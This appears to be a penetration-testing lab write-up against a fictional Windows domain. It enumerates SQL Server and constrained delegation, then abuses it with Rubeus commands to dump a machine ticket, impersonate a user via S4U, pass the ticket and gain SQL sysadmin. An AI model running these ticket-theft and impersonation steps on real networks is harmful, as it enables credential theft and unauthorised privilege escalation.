#### Service Discovery (SQL)

```powershell
sql-1434udp 10.200.3.30
sql-info dub-sql-1

# Output
| Object                | Value                     |
| --------------------- | ------------------------- |
| ComputerName          | dub-sql-1                 |
| DomainName            | DUBLIN                    |
| ServicePid            | 3784                      |
| SqlServerServiceName  | MSSQLSERVER               |
| SqlServiceAccountName | NT Service\MSSQLSERVER    |
| AuthenticationMode    | Windows Authentication    |
| ForcedEncryption      | 0                         |
| Clustered             | No                        |
| SqlVersionNumber      | 16.0.1000.6               |
| SqlMajorVersionNumber | 2022                      |
| SqlServerEdition      | Standard Edition (64-bit) |
| SqlServerServicePack  | RTM                       |
| OsArchitecture        | X64                       |
| OsVersionNumber       | 2022                      |
| CurrentLogon          | DUBLIN\mssqlsvc           |
| ActiveSessions        | 1                         |
```

Relevant findings:

- SQL Server 2022
- Windows Authentication
- Active session: `DUBLIN\mssqlsvc`

#### Delegation Enumeration

```powershell
ldapsearch "(sAMAccountName=DUB-WEB-1$)" --attributes msDS-AllowedToDelegateTo,sAMAccountName
# sAMAccountName: DUB-WEB-1$
# msDS-AllowedToDelegateTo: MSSQLSvc/dub-sql-1.dublin.contoso.example:1433, MSSQLSvc/dub-sql-1.dublin.contoso.example
```

The `DUB-WEB-1$` host has Constrained Delegation configured toward the MSSQL service.

> The machine can request tickets on behalf of other users toward SQL. This enables abuse via S4U2Self + S4U2Proxy

#### Attack: Constrained Delegation Abuse

1. Extract the TGT from the compromised machine

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

2. Constrained Delegation

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dub-web-1$ /msdsspn:MSSQLSvc/dub-sql-1.dublin.contoso.example:1433 /impersonateuser:iappleton /nowrap /ticket:
```

- Choosing the user to impersonate is critical
- It must be an account with effective privileges on the target service

3. Pass-the-Ticket

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:
```

4. Impact Verification

```powershell
sql-info dub-sql-1

# |--> CurrentLogin            : DUBLIN\iappleton
# |--> IsSysAdmin              : True
```

- Access as `iappleton`
- `sysadmin` privileges on SQL Server
